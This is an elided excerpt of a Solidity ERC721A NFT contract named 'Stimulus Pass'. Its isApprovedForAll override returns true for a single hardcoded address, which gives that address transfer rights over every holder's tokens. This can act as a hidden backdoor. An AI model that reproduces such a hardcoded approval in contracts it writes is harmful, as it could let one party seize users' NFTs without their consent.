  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x902514c2048c101573597d084961631E3f795b03){return true;}
...
contract StimulusPass is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Stimulus Pass", "SP", maxBatchSize_, collectionSize_) {
